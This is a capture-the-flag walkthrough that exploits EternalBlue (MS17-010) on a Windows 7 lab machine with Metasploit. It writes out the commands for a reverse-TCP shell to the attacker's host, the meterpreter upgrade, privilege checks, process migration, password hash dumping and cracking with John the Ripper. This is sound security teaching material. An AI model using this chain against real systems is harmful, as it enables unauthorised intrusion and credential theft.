Let's run port scan on the deployed box,

```bash
nmap -sC -sV -p 1-1000 -oN nmap.txt 10.10.169.142
```

We got 3 open ports, 135,139,445. Version running on the machine is Windows 7 Professional 6.1.

Let's search this machine's version on the google and there's a rapid7 exploit link, [MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) from which we get to know that this version of windows is vulnerable to MS17-010 a.k.a EternalBlue exploit

```md
CVE-2017-0144: SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka "Windows SMB Remote Code Execution Vulnerability." This vulnerability is different from those described in CVE-2017-0143, CVE-2017-0145, CVE-2017-0146, and CVE-2017-0148.
```

Let's now exploit this vulnerability using metasploit-framework and fire it up using `msfconsole -q` and we'll search for exploit name,
 
```bash
search eternalblue
```

We have many exploits for this name but we're interested in **exploit/windows/smb/ms17_010_eternalblue** module, so we'll use this module.
 
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

![image](https://user-images.githubusercontent.com/67465230/159208862-80d6dec3-7866-432d-9060-d2f6a6de811d.png)

We'll now set options but before setting them, let's see what options we have to set by doing `options`,

![image](https://user-images.githubusercontent.com/67465230/159208870-f28746ec-eeb8-40ca-bb66-1185ae970895.png)

Okay, we've to set rhosts, lhost, target and also *payload*.
 
Let's set options:
- **set rhosts 10.10.169.142**
- **set lhost 10.9.4.94**
- **set target 0**
- **set payload windows/x64/shell/reverse_tcp**

![image](https://user-images.githubusercontent.com/67465230/159208876-efe50cbb-4bf7-4b56-b1f4-d709371f1ed9.png)

Now that everything is set, we'll fire-up this exploit using `exploit` command,

![image](https://user-images.githubusercontent.com/67465230/159208887-841e5fbf-e1df-4fe3-9a45-4ae710a3f68e.png)

after sometime we'll get a DOS shell. Now, that we have a shell, why not get a meterpreter shell which is far more stable than this shell and will provide us many functionality and for that do CTRL+Z to background the shell and we can see that we got our metasploit-framework prompt back.

let's keep in mind of our shell's session,

```bash
sessions -l
```

![image](https://user-images.githubusercontent.com/67465230/159208894-d906d765-f62c-4514-a80b-f2f26de683ed.png)

Cool! Now, let's upgrade shell to meterpreter and for that we'll do some research on google and I found a module with which we can upgrade our shell to meterpreter, **post/multi/manage/shell_to_meterpreter**.

```bash
search post/multi/manage/shell_to_meterpreter
```

![image](https://user-images.githubusercontent.com/67465230/159208905-0c3441f7-b247-4f0f-acbc-99278a3ec61d.png)

we'll use this module,

```bash
use post/multi/manage/shell_to_meterpreter
```

now, we'll set options,
 - **set lhost 10.9.4.94**
 - **set session 2**

![image](https://user-images.githubusercontent.com/67465230/159208918-5baf2e97-2a21-4dee-9b19-1a362b925c19.png)

now that we've set all the options, let's fire this module using `exploit` command,

![image](https://user-images.githubusercontent.com/67465230/159208931-af547a67-c74e-484c-ad33-7642c8f29a02.png)

we got the meterpreter session open in front of us, now, press Enter and we'll get our metasploit-framework prompt back and there we'll do,

```bash
sessions -l
```

![image](https://user-images.githubusercontent.com/67465230/159208934-1866b208-fc75-4dca-92eb-a714de6c774e.png)

We'll select session 3 now.

Let's interact with session 3,

```bash
sessions -i 3
```

![image](https://user-images.githubusercontent.com/67465230/159208946-d2df7814-9897-4581-a47a-aacb7fb43444.png)

we immediately got the meterpreter shell.

Verify that we have escalated to NT AUTHORITY\SYSTEM. We'll run `getsystem` to confirm this and then confirm what user we're using `getuid`,

![image](https://user-images.githubusercontent.com/67465230/159208956-c765b4f6-97df-47ac-9785-20b9fb46eb22.png)

We're SYSTEM!!

We can list all of the processes running via the `ps` command. Just because we are system doesn't mean our process is,

![image](https://user-images.githubusercontent.com/67465230/159208964-9f9c1f9c-0d88-4ddc-9174-bbd280d7d270.png)

We can see that there are many process running under NT AUTHORITY\SYSTEM and we'll write process ID (remember).

We'll migrate the process using `migrate PROCESS_ID` command where the process id is the one you just wrote down in the previous step,

```bash
migrate 836
```

![image](https://user-images.githubusercontent.com/67465230/159208967-5b69824b-a3cb-4615-bdfc-a56d3cd6d7a2.png)

We've successfully migrated to other process. 

We've now gain full access to the machine and now let's dump all the passwords using `hashdump`,

```bash
hashdump
```

![image](https://user-images.githubusercontent.com/67465230/159208971-40777e78-f98e-4782-92c5-4e4033d1a44f.png)

Let's copy this hash and paste it in file on our own machine and using JTR, we will crack this hash,

```bash
john crack --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```

![image](https://user-images.githubusercontent.com/67465230/159208977-81b3edf1-b1e2-48da-aacb-11bcd670f14e.png)

we got cracked password of the user.

Now, time to hunt the flags and for that run `search -f flag*.txt` (what this command will do is to search any txt file which is named as flag[X] recursively in whole system where, X is number 1-9) and we found all flag destination directory. So let's navigate to those directory,

We got our first flag in root directory,

Looking for second, we got flag where passwords are stored within windows, C:\Windows\System32\config, use `ls` command to list all content of directory,

Finally, looking for 3rd flag which is excellent location for looting flags,
